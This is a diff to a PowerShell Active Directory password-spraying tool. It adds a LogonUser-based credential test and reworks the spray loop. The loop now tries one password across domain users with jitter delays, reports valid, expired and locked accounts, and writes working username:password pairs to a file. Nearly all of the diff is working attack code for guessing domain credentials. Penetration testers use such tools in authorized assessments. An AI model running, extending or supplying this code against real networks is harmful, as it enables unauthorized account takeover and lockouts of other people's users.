@@ -171,6 +171,7 @@ function Invoke-DomainPasswordSpray{
     if ($UserList -eq "")
     {
         $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts -Filter $Filter
+
     }
     else
     {
@@ -497,6 +498,62 @@ function Get-DomainUserList
     return $UserListArray
 }
 
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+
+public class LogonUtil {
+    [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
+    public static extern bool LogonUser(
+        string lpszUsername,
+        string lpszDomain,
+        string lpszPassword,
+        int dwLogonType,
+        int dwLogonProvider,
+        out IntPtr phToken
+    );
+}
+"@ -ErrorAction Stop
+
+function Test-KerberosCredential {
+    param (
+        [string]$Username,
+        [string]$Password,
+        [string]$Domain = $env:USERDOMAIN
+    )
+
+    $tokenHandle = [IntPtr]::Zero
+    $LogonType = 2        # Interactive
+    $LogonProvider = 2    # Use default (Kerberos if joined to domain)
+
+    $success = [LogonUtil]::LogonUser($Username, $Domain, $Password, $LogonType, $LogonProvider, [ref]$tokenHandle)
+
+    if ($success) {
+        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($tokenHandle)
+        return [pscustomobject]@{
+            Username = $Username
+            Password = $Password
+            Domain   = $Domain
+            Status   = "VALID"
+        }
+    } else {
+        $errorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
+        $status = switch ($errorCode) {
+            1326 { "INVALID PASSWORD" }
+            1327 { "USER NOT FOUND" }
+            1909 { "ACCOUNT LOCKED" }
+            1330 { "PASSWORD EXPIRED" }
+            default { "ERROR $errorCode" }
+        }
+        return [pscustomobject]@{
+            Username = $Username
+            Password = $Password
+            Domain   = $Domain
+            Status   = $status
+        }
+    }
+}
+
 function Invoke-SpraySinglePassword
 {
     param(
@@ -528,38 +585,61 @@ function Invoke-SpraySinglePassword
     $count = $UserListArray.count
     Write-Host "[*] Now trying password $Password against $count users. Current time is $($time.ToShortTimeString())"
     $curr_user = 0
-    if ($OutFile -ne ""-and -not $Quiet)
-    {
-        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"    
+
+    if ($OutFile -ne "" -and -not $Quiet) {
+        Write-Host -ForegroundColor Yellow "[*] Writing successes to $OutFile"
     }
+
     $RandNo = New-Object System.Random
 
-    foreach ($User in $UserListArray)
-    {
-        if ($UsernameAsPassword)
-        {
+    foreach ($User in $UserListArray) {
+        if ($UsernameAsPassword) {
             $Password = $User
         }
-        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($Domain,$User,$Password)
-        if ($Domain_check.name -ne $null)
-        {
-            if ($OutFile -ne "")
-            {
-                Add-Content $OutFile $User`:$Password
+
+        $dnsDomain = ($Domain -split ",DC=" -replace "LDAP://|DC=" | Where-Object { $_ }) -join '.'
+        $result = Test-KerberosCredential -Username $User -Password $Password -Domain $dnsDomain
+
+        if ($result.status -ne $null) {
+            switch ($result.Status) {
+                "VALID" {
+                    Write-Host -ForegroundColor Green "[+] VALID: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password)"
+                    }
+                }
+
+                "PASSWORD EXPIRED" {
+                    Write-Host -ForegroundColor Cyan "[!] PASSWORD EXPIRED: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # PASSWORD EXPIRED"
+                    }
+                }
+
+                "ACCOUNT LOCKED" {
+                    Write-Host -ForegroundColor Red "[!] ACCOUNT LOCKED: $($result.Domain)\$($result.Username)"
+                    if ($OutFile -ne "") {
+                        Add-Content $OutFile "$($result.Username):$($result.Password) # ACCOUNT LOCKED"
+                    }
+                }
+
+                default {
+                    if (-not $Quiet) {
+                        Write-Host "[-] $($result.Status): $($result.Domain)\$($result.Username)"
+                    }
+                }
             }
-            Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
         }
+
         $curr_user += 1
-        if (-not $Quiet)
-        {
-            Write-Host -nonewline "$curr_user of $count users tested`r"
+        if (-not $Quiet) {
+            Write-Host -NoNewline "$curr_user of $count users tested`r"
         }
-        if ($Delay)
-        {
-            Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+
+        if ($Delay) {
+            Start-Sleep -Seconds $RandNo.Next((1 - $Jitter) * $Delay, (1 + $Jitter) * $Delay)
         }
     }
-
 }
 
 function Get-ObservationWindow($DomainEntry)
